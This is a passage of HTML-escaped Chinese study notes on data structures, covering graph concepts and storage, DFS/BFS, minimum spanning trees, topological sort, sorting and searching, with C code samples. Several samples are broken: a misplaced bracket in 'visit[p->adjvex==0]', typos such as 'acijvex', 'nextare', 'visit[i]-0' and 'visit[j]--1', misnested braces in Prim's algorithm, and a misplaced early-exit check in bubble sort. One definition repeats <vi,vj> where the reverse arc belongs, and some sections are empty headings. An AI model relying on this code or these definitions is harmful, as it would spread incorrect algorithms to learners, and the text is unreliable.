&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;弧&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在有向图中，通常将边称为弧，含箭头的一端称为弧头，另一端称为弧尾，记作&amp;lt;vi,vj&amp;gt;，它表示从顶点vi到顶点vj有一条边。&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;顶点的度、入度和出度&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在无向图中，边记为(vi,vj)，它等价于在有向图中存在&amp;lt;vi,vj&amp;gt;和&amp;lt;vi,vj&amp;gt;两条边。与顶点v相关的边的条数称为顶点v的度。指向顶点v的边的条数称为顶点v的入度，由顶点v发出的边的条数称为顶点v的出度。&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;有向完全图和无向完全图&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;若有向图中有n个顶点，则最多有n(n-1)条边（图中任意两个顶点都有两条边相连)，将具有n(n-1)条边的有向图称为有向完全图。若无向图中有n个顶点，则最多有n(n-1)/2条边（任意两个顶点之间都有一条边)，将具有n(n-1)/2条边的无向图称为无向完全图。&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;路径和路径长度&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在一个图中，路径为相邻顶点序偶所构成的序列。路径长度是指路径上边的数目。&lt;/p&gt;
&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;简单路径&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;序列中顶点不重复出现的路径称为简单路径。&lt;/p&gt;
&lt;ol start=&#34;8&#34;&gt;
&lt;li&gt;回路&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;若一条路径中第一个顶点和最后一个顶点相同,则这条路径是一条回路。&lt;/p&gt;
&lt;ol start=&#34;9&#34;&gt;
&lt;li&gt;连通、连通图和连通分量&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在无向图中，如果从顶点vi到顶点vj有路径，则称vi和vj连通。如果图中任意两个顶点之间都连通，则称该图为连通图;否则，图中的极大连通子图称为连通分量。&lt;/p&gt;
&lt;ol start=&#34;10&#34;&gt;
&lt;li&gt;强连通图和强连通分量&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在有向图中，若从vi到vj有路径，则称从vi到vj是连通的。如果对于每一对顶点vi和vj，从vi到vj和从vj到vi都有路径，则称该图为强连通图:否则，将其中的极大强连通子图称为强连通分量。&lt;/p&gt;
&lt;ol start=&#34;11&#34;&gt;
&lt;li&gt;权和网&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;图中每条边都可以附有一个对应的数，这种与边相关的数称为权。权可以表示从一个顶点到另一个顶点的距离或者花费的代价。边上带有权的图称为带权图，也称为网。&lt;/p&gt;
&lt;h3 id=&#34;图的存储结构&#34;&gt;图的存储结构&lt;/h3&gt;
&lt;h4 id=&#34;邻接矩阵&#34;&gt;邻接矩阵&lt;/h4&gt;
&lt;p&gt;邻接矩阵是表示顶点之间相邻关系的矩阵。设G=(V，E)是具有n个顶点的图，顶点序号依次为0，1，…，n-1，则G的邻接矩阵是具有如下定义的n阶方阵A:&lt;br&gt;
A[i][j]=1表示顶点i与顶点j邻接，即i与j之间存在边或者弧。&lt;br&gt;
A[i][j]=0表示顶点i与顶点j不邻接（0≤i， j≤n-1)。&lt;br&gt;
邻接矩阵是图的顺序存储结构，由邻接矩阵的行数或列数可知图中的顶点数。对于无向图，邻接矩阵是对称的，矩阵中“1”的个数为图中总边数的两倍，矩阵中第i行或第i列的元素之和即为顶点i的度。对于有向图，矩阵中“1”的个数为图的边数，矩阵中第i行的元素之和即为顶点i的出度，第j列元素之和即为顶点j的入度。&lt;/p&gt;
&lt;h4 id=&#34;邻接表&#34;&gt;邻接表&lt;/h4&gt;
&lt;p&gt;邻接表是图的一种链式存储结构。所谓邻接表就是对图中的每个顶点﹔建立一个单链表，每个单链表的第一个结点存放有关顶点的信息，把这一结点看作链表的表头，其余结点存放有关边的信息。因此，邻接表由单链表的表头形成的顶点表和单链表其余结点形成的边表两部分组成。一般顶点表存放顶点信息和指向第一个边结点的指针，边表结点存放与当前顶点相邻接顶点的序号和指向下一个边结点的指针。&lt;/p&gt;
&lt;h3 id=&#34;图的遍历算法操作&#34;&gt;图的遍历算法操作&lt;/h3&gt;
&lt;h4 id=&#34;深度优先搜素遍历&#34;&gt;深度优先搜素遍历&lt;/h4&gt;
&lt;p&gt;图的深度优先搜索遍历（DFS）类似于二叉树的先序遍历。它的基本思想是:首先访问出发点v,并将其标记为已访问过;然后选取与v邻接的未被访问的任意一个顶点 w，并访问它;再选取与w邻接的未被访问的任一顶点并访问，以此重复进行。当一个顶点所有的邻接顶点都被访问过时，则依次退回到最近被访问过的顶点，若该顶点还有其他邻接顶点未被访问，则从这些未被访问的顶点中取一个并重复上述访问过程，直至图中所有顶点都被访问过为止。&lt;/p&gt;
&lt;p&gt;以邻接表为存储结构的图的深度优先搜索遍历算法如下:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int visit[maxSize];
void DFS(AGraph *G, int v)
{
    ArcNode *p;
    visit[v]=1;
    Visit(v);
    p=G-&amp;gt;adjust[v].firstarc;
    while(p!=NULL)
    {
        if(visit[p-&amp;gt;adjvex]==0)
        {
            DFS(G,p-&amp;gt;adjvex);
        }        
        p=p-&amp;gt;nextarc;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;广度优先搜索遍历&#34;&gt;广度优先搜索遍历&lt;/h4&gt;
&lt;p&gt;图的广度优先搜索遍历（BFS）类似于树的层次遍历。它的基本思想是:首先访问起始顶点v，然后选取与v邻接的全部顶点w&lt;sub&gt;1&lt;/sub&gt;，…，w&lt;sub&gt;n&lt;/sub&gt;,进行访问，再依次访问与w&lt;sub&gt;1&lt;/sub&gt;,…,w&lt;sub&gt;n&lt;/sub&gt;,邻接的全部顶点（已经访问过的除外)，以此类推，直到所有顶点都被访问过为止。&lt;/p&gt;
&lt;p&gt;广度优先搜索遍历图时，需要用到一个队列(二叉树的层次遍历也要用到队列)，算法执行过程可简单概括如下:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;任取图中一个顶点访问，入队，并将这个顶点标记为已访问。&lt;/li&gt;
&lt;li&gt;当队列不空时循环执行:出队，依次检查出队顶点的所有邻接顶点，访问没有被访问过的邻接顶点并将其入队。&lt;/li&gt;
&lt;li&gt;当队列为空时跳出循环，广度优先搜索即完成。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以邻接表为存储结构的广度优先搜索遍历算法如下:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void BFS(AGraph *G, int v, int visit[maxSize])
{
    ArcNode *p;
    int que[maxSize], front=0, rear=0;
    int j;
    Visit(v);
    visit[v]=1;
    rear=(rear+1)%maxSize;
    que[rear]=v;
    while(front!=rear)
    {
        front=(front+1)%maxSize;
        j=que[front];
        p=G-&amp;gt;adjlist[j].firstarc;
        while(p!=NULL)
        {
            if(visit[p-&amp;gt;adjvex==0])
            {
                Visit(p-&amp;gt;adjvex);
                visit[p-&amp;gt;adjvex]=1;
                rear=(rear+1)%maxSize;
                que[rear]=p-&amp;gt;adjvex;
            }
            p=p-&amp;gt;nextarc;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;例题&#34;&gt;例题&lt;/h4&gt;
&lt;p&gt;【例1】设计一个算法，求不带权无向连通图G中距离顶点v最远的一个顶点（所谓最远就是到达v的路径长度最长)。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int BFS(AGraph *G, int v)
{
    ArcNode *p;
    int que[maxSize],front=0,rear=0;
    int visit[maxSize];
    int i,j;
    for(i=0;i&amp;lt;G-&amp;gt;n;++i)
       visit[i]=0;
    rear=(rear+1)%maxSize;
    que[rear]=v;
    visit[v]=1;
    while(front!=rear)
    {
        front=(front+1)%maxSize;
        j=que[front];
        p=G-&amp;gt;adjlist[j].firstarc;
        while(p!=NULL)
        {
            if(visit[p-&amp;gt;adjvex]==0)
            {
                visit[p-&amp;gt;adjvex]=1;
                rear=(rear+1)%maxSize;
                que[rear]=p-&amp;gt;adjvex;
            }
            p=p-&amp;gt;nextarc;
        }
    }
    return j;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;【例2】设计一个算法，判断无向图G是否是一棵树。若是树，返回1，否则返回0。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void DFS2(AGraph *G,int v,int &amp;amp;vn,int &amp;amp;en)
{
    ArcNode *p;
    visit[v]=1;
    ++vn;
    p=G-&amp;gt;adjlist[v].firstarc;
    while(p!=NULL)
    {
        ++en;
        if(visit[p-&amp;gt;adjvex]==0)
        {
            DFS2(G,p-&amp;gt;acijvex, vn, en);
        }
        p=p-&amp;gt;nextare;
    }
}
int GisTree (AGraph*G)
{
    int vn=0, en=0,i;
    for(i=0;i&amp;lt;G-&amp;gt;n;++i)
        visit[i]-0;
    DFS2(G, 1, vn,en);
    if(vn==G-&amp;gt;n&amp;amp;&amp;amp;(G-&amp;gt;n-1)==en/2)
        return 1;
    else 
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;【例3】图采用邻接表存储，设计一个算法，判别顶点i和顶点j(i!=j）之间是否有路径。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int DFSTrave(AGraph *G,int i, int j)
{
    int k;
    for(k=0;k&amp;lt;G-&amp;gt;n; ++k)
        visit[k]-0;
    DFS(G,i);
    if(visit[j]--1)
        return 1;
    else
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;最小生成树&#34;&gt;最小生成树&lt;/h3&gt;
&lt;h4 id=&#34;普利姆算法和克鲁斯卡尔算法&#34;&gt;普利姆算法和克鲁斯卡尔算法&lt;/h4&gt;
&lt;h5 id=&#34;普利姆算法&#34;&gt;普利姆算法&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;算法思想&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;从图中任意取出一个顶点，把它当成一棵树，然后从与这棵树相接的边中选取一条最短（权值最小)的边，并将这条边及其所连接的顶点也并入这棵树中，此时得到一棵有两个顶点的树。然后从与这棵树相接的边中选取一条最短的边，并将这条边及其所连顶点并入当前树中，得到一棵有3个顶点的树。以此类推，直到图中所有顶点都被并入树中为止，此时得到的生成树就是最小生成树。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;普利姆算法执行过程
从树中某一个顶点v0开始，构造生成树的算法执行过程如下:&lt;br&gt;
1）将v0到其他顶点的所有边当作候选边。&lt;br&gt;
2）重复以下步骤n-1次，使得其他n-1个顶点被并入到生成树中。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;从候选边中挑选出权值最小的边输出，并将与该边另一端相接的顶点v并入生成树中;&lt;/li&gt;
&lt;li&gt;考查所有剩余顶点v,如果(v,vi)的权值比 lowcost[vj]小，则用(v,vi)的权值更新lowcost[vi]。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void Prim (MGraph g, int v0, int &amp;amp;sum)
{
    int lowcost[maxsize], vset[maxsize],v;
    int i,j,k,min;
    v=v0;
    for(i=0;i&amp;lt;g.n;++i)
    {
        lowcost[i]=g.edges[v0][i];
        vset[i]=0;
    }
    vset[v0]=1;
    sum=0;
    for(i=0;i&amp;lt;g.n-1;++i)
    {
        min=INF;
        for(j=0;j&amp;lt;g.n;++j)
        {
            if(vset[j]==0&amp;amp;&amp;amp;lowcost[j]&amp;lt;min)
            {
                min=lowcost[j];
                k=j;
            }
        vset[k]=1;
        v=k;
        sum+=min;
        for(j=0;j&amp;lt;g.n;++j)
        {
            if(vset[j]==0&amp;amp;&amp;amp;g.edges[v][j]&amp;lt;lowcost[j])
               lowcost[j]=g.edges[v][j];
        }
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;克鲁斯卡尔算法&#34;&gt;克鲁斯卡尔算法&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;算法思想&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;每次找出候选边中权值最小的边，就将该边并入生成树中。重复此过程直到所有边都被检测完为止。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;克鲁斯卡尔算法执行过程&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;1）将图中边按照权值从小到大排序，然后从最小边开始扫描各边，并检测当前边是否为候选边，即是否该边的并入会构成回路，如不构成回路，则将该边并入当前生成树中，直到所有边都被检测完为止。&lt;/p&gt;
&lt;p&gt;2）并查集。判断是否产生回路要用到并查集。并查集中保存了一棵或者几棵树，这些树有这样的特点:通过树中一个结点，可以找到其双亲结点，进而找到根结点（其实就是之前讲过的树的双亲存储结构)。这种特性有两个好处:一是可以快速地将两个含有很多元素的集合并为一个。两个集合就是并查集中的两棵树，只需找到其中一棵树的根，然后将其作为另一棵树中任何一个结点的孩子结点即可。二是可以方便地判断两个元素是否属于同一个集合。通过这两个元素所在的结点找到它们的根结点，如果它们有相同的根，则说明它们属于同一个集合，否则属于不同集合。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;typedef struct
{
    int a,b;
    int w;
}Road;
Road road[maxSize];
int v[maxSize];
int getRoot(int a)
{
    while(a!=v[a])
        a=v[a];
    return a;
}
void Kruskal(MGraph g,int &amp;amp;sum,Road road[])
{
    int i;
    int N,E,a,b;
    N=g.n;
    E=g.e;
    sum=0;
    for(i=0;i&amp;lt;N;++i)
    {
        v[i]=i;
    }
    sort(road,E);
    for(i=0;i&amp;lt;E;++i)
    {
        a=getRoot(road[i].a);
        b=getRoot(road[i].b);
        if(a!=b)
        {
            v[a]=b;
            sum+=road[i].w;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;最短路径&#34;&gt;最短路径&lt;/h3&gt;
&lt;h4 id=&#34;迪杰斯特拉算法&#34;&gt;迪杰斯特拉算法&lt;/h4&gt;
&lt;h4 id=&#34;弗洛伊德算法&#34;&gt;弗洛伊德算法&lt;/h4&gt;
&lt;h3 id=&#34;拓扑排序&#34;&gt;拓扑排序&lt;/h3&gt;
&lt;h4 id=&#34;aov网&#34;&gt;AOV网&lt;/h4&gt;
&lt;p&gt;活动在顶点上的网(Activity On Vertex network,AOV网)是一种可以形象地反映出整个工程中各个活动之间的先后关系的有向图。&lt;/p&gt;
&lt;h4 id=&#34;拓扑排序核心算法&#34;&gt;拓扑排序核心算法&lt;/h4&gt;
&lt;p&gt;对一个有向无环图G进行拓扑排序，是将G中所有顶点排成一个线性序列，使得图中任意一对顶点u和v，若存在由u到v的路径，则在拓扑排序序列中一定是u出现在v的前面。&lt;/p&gt;
&lt;p&gt;在一个有向图中找到一个拓扑排序序列的过程如下:&lt;br&gt;
1）从有向图中选择一个没有前驱（入度为0）的顶点输出。&lt;br&gt;
2）删除1）中的顶点，并且删除从该顶点发出的全部边。&lt;br&gt;
3）重复上述两步，直到剩余的图中不存在没有前驱的顶点为止。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int TopSort(AGraph *G)
{
    int i,j,n=0;
    int stack[maxSize],top=-1;
    ArcNode *p;
    for(i=0;i&amp;lt;G-&amp;gt;n;++i)
    {
        if(G-&amp;gt;adjlist[i].count==0)
           stack[++top]=i;
    }
    while(top!=-1)
    {
        i=stack[top--];
        ++n;
        p=G-&amp;gt;adjlist[i].firstarc;
        while(p!=NULL)
        {
            j=p-&amp;gt;adjvex;
            --(G-&amp;gt;adjlist[j].count);
            if(G-&amp;gt;adjlist[j].count==0)
               stack[++top]=j;
            p=p-&amp;gt;nextarc;
        }
    }
    if(n==G-&amp;gt;n)
        return 1;
    else 
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;关键路径&#34;&gt;关键路径&lt;/h3&gt;
&lt;h4 id=&#34;aoe网&#34;&gt;AOE网&lt;/h4&gt;
&lt;p&gt;对于活动在边上的网（Activity On Edge network，AOE网）可以和AOV网对比着来记忆。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;两者的相同点:都是有向无环图。&lt;/li&gt;
&lt;li&gt;两者的不同点:AOE网的边表示活动，边有权值，边代表活动持续时间;顶点表示事件，事件是图中新活动开始或者旧活动结束的标志。AOV网的顶点表示活动，边无权值，边代表活动之间的先后关系。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;关键路径核心算法&#34;&gt;关键路径核心算法&lt;/h4&gt;
&lt;h2 id=&#34;排序&#34;&gt;排序&lt;/h2&gt;
&lt;h3 id=&#34;排序的基本概念&#34;&gt;排序的基本概念&lt;/h3&gt;
&lt;h4 id=&#34;排序算法的分类&#34;&gt;排序算法的分类&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;插入类的排序&lt;/li&gt;
&lt;li&gt;交换类的排序&lt;/li&gt;
&lt;li&gt;选择类的排序&lt;/li&gt;
&lt;li&gt;归并类的排序&lt;/li&gt;
&lt;li&gt;基数类的排序&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;插入类排序&#34;&gt;插入类排序&lt;/h3&gt;
&lt;h4 id=&#34;直接插入排序&#34;&gt;直接插入排序&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;算法思想&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;每趟将一个待排序的关键字按照其值的大小播入到已经排好的部分有序序列的适当位置上，直到所有待排关键字都被插入到有序序列中为止。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void InsertSort(int R[],int n)
{
    int i,j;
    int temp;
    for(i=1;i&amp;lt;n;++i)
    {
        temp=R[i];
        j=i-1;
        while(j&amp;gt;=0&amp;amp;&amp;amp;temp&amp;lt;R[j])
        {
            R[j+1]=R[j];
            --j;
        }
        R[j+1]=temp;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;折半插入排序&#34;&gt;折半插入排序&lt;/h4&gt;
&lt;p&gt;折半插入排序的基本思想和直接插入排序类似，区别是查找插入位置的方法不同，折半插入排序是采用折半查找法来查找插入位置的。&lt;/p&gt;
&lt;p&gt;折半查找法的一个基本条件是序列已经有序，而从直接插入排序的流程中可以看出，每次都是在一个已经有序的序列中插入一个新的关键字，因此可以用折半查找法在这个有序序列中查找插入位置。&lt;/p&gt;
&lt;h4 id=&#34;希尔排序&#34;&gt;希尔排序&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;算法介绍&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;希尔排序又叫作缩小增量排序，其本质还是插入排序，只不过是将待排序列按某种规则分成几个子序列，分别对这几个子序列进行直接插入排序。这个规则的体现就是增量的选取，如果增量为 1，就是直接插入排序。例如，先以增量5来分割序列，即将下标为0、5、10、15…的关键字分成一组，将下标为1、6、11、16…的关键字分成另一组等，然后分别对这些组进行直接插入排序，这就是一趟希尔排序。将上面排好序的整个序列，再以增量2分割，即将下标为0、2、4、6、8…的关键字分成一组，将下标为1、3、5、7、9…的关键字分成另一组等，然后分别对这些组进行直接插入排序，这又完成了一趟希尔排序。最后以增量1分割整个序列，其实就是对整个序列进行一趟直接插入排序，从而完成整个希尔排序。&lt;/p&gt;
&lt;p&gt;注意到增量5、2、1是逐渐缩小的，这就是缩小增量排序的由来。前面讲过，直接插入排序适合于序列基本有序的情况，希尔排序的每趟排序都会使整个序列变得更加有序，等整个序列基本有序了，再来一趟直接插入排序，这样会使排序效率更高，这就是希尔排序的思想。&lt;/p&gt;
&lt;h3 id=&#34;交换类排序&#34;&gt;交换类排序&lt;/h3&gt;
&lt;h4 id=&#34;起泡排序&#34;&gt;起泡排序&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;算法介绍&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;起泡排序又称冒泡排序。它是通过一系列的“交换”动作完成的。首先第一个关键字和第二个关键字比较，如果第一个大，则二者交换，否则不交换;然后第二个关键字和第三个关键字比较，如果第二个大，则二者交换，否则不交换……。一直按这种方式进行下去，最终最大的那个关键字被交换到了最后，一趟起泡排序完成。经过多趟这样的排序，最终使整个序列有序。在这个过程中，大的关键字像石头一样“沉底”，小的关键字像气泡一样逐渐向上“浮动”，起泡排序的名字由此而来。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void BubbleSort(int R[],int n)
{
    int i,j,flag;
    int temp;
    for(i=n-1;i&amp;gt;=1;--i)
    {
        flag=0;
        for(j=1;j&amp;lt;=i;++j)
        {
            if(R[j-1]&amp;gt;R[j])
            {
                temp=R[j];
                R[j]=R[j-1];
                R[j-1]=temp;
                flag=1;
            }
            if(flag==0)
                return;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;快速排序&#34;&gt;快速排序&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;算法介绍&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;快速排序也是“交换”类的排序，它通过多次划分操作来实现排序。以升序为例，其执行流程可以概括为:每一趟选择当前所有子序列中的一个关键字（通常是第一个）作为枢轴，将子序列中比枢轴小的移到枢轴前面，比枢轴大的移到枢轴后面;当本趟所有子序列都被枢轴以上述规则划分完毕后会得到新的一组更短的子序列，它们成为下一趟划分的初始序列集。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void QuickSort(int R[], int low, int high)
{
    int temp;
    int i=low,j=high;
    if(low&amp;lt;high)
    {
        temp=R[low];
        while(i&amp;lt;j)
        {
            while(j&amp;gt;i&amp;amp;&amp;amp;R[j]&amp;gt;=temp)
            {
                --j;
            }
            if(i&amp;lt;j)
            {
                R[i]=R[j];
                ++i;
            }
            while(i&amp;lt;j&amp;amp;&amp;amp;R[i]&amp;lt;temp)
            {
                ++i;
            }
            if(i&amp;lt;j)
            {
                R[j]=R[i];
                --j;
            }
        }
        R[i]=temp;
        QuickSort(R,low,i-1);
        QuickSort(R,i+1,high);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;选择类排序&#34;&gt;选择类排序&lt;/h3&gt;
&lt;h4 id=&#34;简单选择排序&#34;&gt;简单选择排序&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;算法介绍&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;选择类排序的主要动作是“选择”，简单选择排序采用最简单的选择方式，从头至尾顺序扫描序列,找出最小的一个关键字，和第一个关键字交换，接着从剩下的关键字中继续这种选择和交换，最终使序列有序。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void SelectSort(int R[],int n)
{
    int i,j,k;
    int temp;
    for(i=0;i&amp;lt;n;++i)
    {
        k=i;
        for(j=i+1;j&amp;lt;n;++j)
        {
            if(R[k]&amp;lt;R[j])
            {
                k=j;
            }
        }
        temp=R[i];
        R[i]=R[k];
        R[k]=temp;
    }

}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;堆排序&#34;&gt;堆排序&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;算法介绍&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;堆是一种数据结构，可以把堆看成一棵完全二叉树，这棵完全二叉树满足:任何一个非叶结点的值都不大于(或不小于）其左、右孩子结点的值。若父亲大孩子小，则这样的堆叫作大顶堆;若父亲小孩子大，则这样的堆叫作小顶堆。&lt;/p&gt;
&lt;p&gt;根据堆的定义知道，代表堆的这棵完全二叉树的根结点的值是最大（或最小）的，因此将一个无序序列调整为一个堆，就可以找出这个序列的最大(或最小）值，然后将找出的这个值交换到序列的最后(或最前)，这样，有序序列关键字增加1个，无序序列中关键字减少1个，对新的无序序列重复这样的操作，就实现了排序。这就是堆排序的思想。&lt;/p&gt;
&lt;p&gt;堆排序中最关键的操作是将序列调整为堆。整个排序的过程就是通过不断调整，使得不符合堆定义的完全二叉树变为符合堆定义的完全二叉树。&lt;/p&gt;
&lt;h3 id=&#34;二路归并排序&#34;&gt;二路归并排序&lt;/h3&gt;
&lt;h3 id=&#34;基数排序&#34;&gt;基数排序&lt;/h3&gt;
&lt;h3 id=&#34;外部排序&#34;&gt;外部排序&lt;/h3&gt;
&lt;h2 id=&#34;查找&#34;&gt;查找&lt;/h2&gt;
&lt;h3 id=&#34;查找的基本概念顺序查找法折半查找法&#34;&gt;查找的基本概念、顺序查找法、折半查找法&lt;/h3&gt;
&lt;h4 id=&#34;查找的基本概念&#34;&gt;查找的基本概念&lt;/h4&gt;
&lt;p&gt;查找的定义:给定一个值k，在含有n个记录的表中找出关键字等于k的记录。若找到，则查找成功，返回该记录的信息或者该记录在表中的位置;否则查找失败，返回相关的指示信息。&lt;/p&gt;
&lt;h4 id=&#34;顺序查找法&#34;&gt;顺序查找法&lt;/h4&gt;
&lt;p&gt;顺序查找法是一种最简单的查找方法。它的基本思路是:从表的一端开始，顺序扫描线性表，依次将扫描到的关键字和给定值k进行比较，若当前扫描的关键字与k相等，则查找成功;若扫描结束后，仍未发现关键字等于k的记录，则查找失败。由以上可知，顺序查找法对于顺序表和链表都是适用的。对于顺序表，可以通过数组下标递增来顺序扫描数组中的各个元素;对于链表，则可通过表结点指针(假设为p）反复执行p=p-&amp;gt;next;来扫描表中各个元素。&lt;/p&gt;
&lt;h4 id=&#34;折半查找法&#34;&gt;折半查找法&lt;/h4&gt;
&lt;p&gt;折半查找的基本思路:设R[low，…., high]是当前的查找区间，首先确定该区间的中间位置mid=(low+high)/2;，然后将待查的k值与R[mid]比较，若相等，则查找成功，并返回该位置，否则需确定新的查找区间。若R[mid]&amp;gt;k，则由表的有序性可知R[mid，….,high]均大于k，因此若表中存在关键字等于k的记录，则该记录必定是在 mid左边的子表R[low，…,mid-1]中，故新的查找区间是左子表R[low，.…, mid-1]。类似地，若R[mid]&amp;lt;k，则要查找的k必在mid的右子表K[mid+1，…，high]中，即新的查找区间是右子表R[mid+1，.… , high]。递归地处理新区间，直到子区间的长度小于1时查找过程结束。&lt;/p&gt;
&lt;h4 id=&#34;分块查找&#34;&gt;分块查找&lt;/h4&gt;
&lt;p&gt;分块查找又称为索引顺序查找，其数据结构可以简单地描述为:分块查找把线性表分成若干块，每一块中的元素存储顺序是任意的，但是块与块之间必须按照关键字大小有序排列，即前一块中的最大关键字要小于后一块中的最小关键字。对顺序表进行分块查找需要额外建立一个索引表，表中的每一项对应线性表中的一块，每个索引项都由键值分量和链值分量组成，键值分量存放对应块的最大关键字，链值分量存放指向本块第一个元素和最后一个元素的指针（这里的指针可以是存放线性表数组中的元素下标或者地址，或是任何可以帮助找到这个元素的信息)，显然索引表中的所有索引项都是按照其关键字的递增顺序排列的。&lt;/p&gt;
&lt;h3 id=&#34;树形查找&#34;&gt;树形查找&lt;/h3&gt;
&lt;h4 id=&#34;二叉排序树&#34;&gt;二叉排序树&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;二叉树的定义与存储结构&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;（1）二叉排序树BST的定义&lt;br&gt;
1）若它的左子树不空，则左子树上所有关键字的值均不大于（不小于）根关键字的值。&lt;br&gt;
2）若它的右子树不空，则右子树上所有关键字的值均不小于（不大于）根关键字的值。&lt;br&gt;
3）左右子树又各是一棵二叉排序树。&lt;/p&gt;
&lt;p&gt;（2）二叉排序树的存储结构
二叉排序树通常采用二叉链表进行存储，其结点类型定义与一般的二叉树类似。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;typedef struct BTNode
{
    int key;
    struct BTNode *lchild;
    struct BTNode *rchild;
}BTNode;
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;二叉排序树的基本算法&lt;br&gt;
（1） 查找关键字的算法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;BTNode* BSTSearch(BTNode* bt,int key)
{
    if(bt==NULL)
        return NULL;
    else 
    {
        if(bt-&amp;gt;key==key)
            return bt;
        else if(key&amp;lt;bt-&amp;gt;key)
            return BSTSearch(bt-&amp;gt;lchild,key);
        else 
            return BSTSearch(bt-&amp;gt;rchild,key);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;（2） 插入关键字的算法&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int BSTInsert(BTNode *&amp;amp;bt, int key)
{
    if(bt==NULL)
    {
        bt=(BTNode*)malloc(sizeof(BTNode));
        bt-&amp;gt;lchild=bt-&amp;gt;rchild=NULL;
        bt-&amp;gt;key=key;
        return 1;
    }
    else 
    {
        if(key==bt-&amp;gt;key)
            return 0;
            else if (key&amp;lt;bt-&amp;gt;key)
                return BSTInsert(bt-&amp;gt;lchild,key);
            else
                return BSTInsert(bt-&amp;gt;rchild,key);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;平衡二叉树&#34;&gt;平衡二叉树&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;平衡二叉树的概念&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;平衡二叉树又称为AVL树，是一种特殊的二叉排序树。其左右子树都是平衡二叉树，且左右子树高度之差的绝对值不超过1。一句话表述为:以树中所有结点为根的树的左右子树高度之差的绝对值不超过1。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
